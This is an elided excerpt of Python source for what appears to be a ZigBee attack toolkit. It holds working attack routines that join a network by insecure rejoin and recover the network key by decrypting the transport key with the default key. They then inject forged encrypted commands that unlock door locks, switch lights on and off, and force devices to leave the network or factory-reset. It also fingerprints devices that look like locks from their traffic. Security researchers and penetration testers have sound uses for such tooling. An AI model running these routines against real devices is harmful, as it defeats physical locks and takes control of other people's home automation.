from zigdiggity.packets.zcl import (encrypted_off, encrypted_on,
                                    encrypted_toggle, encrypted_unlock, encrypted_factory_reset, encrypted_leave_req)
from zigdiggity.packets.utils import (extended_address_bytes, extended_pan,
                                      get_extended_source, get_frame_counter,
                                      get_pan_id, get_source)
from zigdiggity.packets.nwk_commands import insecure_rejoin, is_rejoin_response
from zigdiggity.packets.dot15d4 import (beacon_request, beacon_response,
                                        data_request, is_beacon_request,
                                        is_beacon_response, is_data_frame,
                                        is_data_request)
...
from zigdiggity.interface.console import (
    print_debug, print_error, print_info, print_notify)
...
def wait_for_frame_counter(radio, panid, addr):
    ...
    print_info(
        "Waiting to observe a frame counter for pan_id:0x%04x, src_addr:0x%04x" % (panid, addr))
...
def wait_for_extended_address_also_frame_counter(radio, panid, addr):
    ...
    print_info(
        "Waiting to observe the extended source for pan_id:0x%04x, src_addr:0x%04x" % (panid, addr))
    ...
    while not timer.has_expired():
        ...
        if panid == get_pan_id(frame) and addr == get_source(frame):
            ...
            if extended_source is not None:
                print_notify("Extended source observed: 0x%016x" %
                             extended_source)
...
def insecure_rejoin_by_panid(radio, panid, src_addr=None, extended_src=None, coord_addr=None, seq_num=None, nwk_seq_num=None):
    ...
    print_notify(
        "Attempting to join PAN ID 0x%04x using insecure rejoin" % panid)
    print_info("Sending insecure rejoin")
    radio.send_and_retry(insecure_rejoin(src_addr, coord_addr, panid, extended_src,
                                         seq_num=dot15d4_seq_iter.next(), nwk_seq_num=nwk_seq_iter.next()))
    radio.send_and_retry(data_request(src_addr, coord_addr,
                                      panid, seq_num=dot15d4_seq_iter.next()))
    ...
    while(not timer.has_expired()):
        ...
        if is_rejoin_response(frame):
            ...
            radio.send_and_retry(data_request(
                src_addr, coord_addr, panid, seq_num=dot15d4_seq_iter.next()))
            break
    ...
    while(not timer.has_expired()):
        ...
        if is_transport_key(frame):
            ...
            coord_extended_source_bytes = extended_address_bytes(
                coord_extended_src)
            decrypted, valid = crypto_utils.zigbee_packet_decrypt(crypto_utils.zigbee_trans_key(
                crypto_utils.DEFAULT_TRANSPORT_KEY), frame, coord_extended_source_bytes)
            if valid:
...
def unlock_lock(radio, panid, addr, network_key, coord_addr=None, coord_extended_addr=None, frame_counter=None):
    ...
    if conflict_succeeded:
        ...
        radio.load_frame(encrypted_unlock(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(
        ), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
...
def light_toggle(radio, panid, addr, network_key, amount, coord_addr=None, coord_extended_addr=None, frame_counter=None):
    ...
    for a in range(amount):
        ...
        for attempts in range(20):
            radio.load_frame(encrypted_toggle(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(
            ), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
            radio.fire_and_retry()
    return True


def light_off(radio, panid, addr, network_key, amount, coord_addr=None, coord_extended_addr=None, frame_counter=None):
    ...
    for a in range(amount):
        ...
        print_info("Attempting to turn off light")
        timer = Timer(OBSERVATION_TIME)

        for attempts in range(20):
            radio.load_frame(encrypted_off(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(
            ), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
            radio.fire_and_retry()
    return True


def light_on(radio, panid, addr, network_key, amount, coord_addr=None, coord_extended_addr=None, frame_counter=None):
    ...
    for a in range(amount):
        ...
        print_info("Attempting to turn on light")
        timer = Timer(OBSERVATION_TIME)
    for a in range(amount):
        for attempts in range(20):
            radio.load_frame(encrypted_on(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(
            ), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
            radio.fire_and_retry()
    return True


def leave_req(radio, panid, addr, network_key, coord_addr=None, coord_extended_addr=None, frame_counter=None):
    ...
    print_info(
        "We're going to send a bunch of leave requests to the target.")
    for attempts in range(30):
        sequence_number = random.randint(0, 255)
        nwk_sequence_number = random.randint(0, 255)
        aps_counter = random.randint(0, 255)
        zcl_sequence_number = random.randint(0, 255)
        radio.load_frame(encrypted_leave_req(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(
        ), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
        radio.fire_and_retry()
    return True


def factory_reset(radio, panid, addr, network_key, coord_addr=None, coord_extended_addr=None, frame_counter=None):
    ...
    print_info(
        "We're going to send a bunch of factory reset packages")
    for attempts in range(20):
        sequence_number = random.randint(0, 255)
        nwk_sequence_number = random.randint(0, 255)
        aps_counter = random.randint(0, 255)
        zcl_sequence_number = random.randint(0, 255)
        radio.load_frame(encrypted_factory_reset(panid, coord_addr, addr, coord_extended_addr, network_key, frame_counter=frame_counter_iter.next(
        ), seq_num=sequence_number, nwk_seq_num=nwk_sequence_number, aps_counter=aps_counter, zcl_seq_num=zcl_sequence_number))
        radio.fire_and_retry()
    return True
    ...
    for pan in trackers:
        for addr in trackers[pan]:
            ...
            if watch.variance() is not None and watch.variance() < THRESHOLD_VARIANCE and watch.mean() > MIN_FREQUENCY:
                ...
                print_notify(
                    "Device 0x%04x on PAN 0x%04x resembles a lock" % (addr, pan))
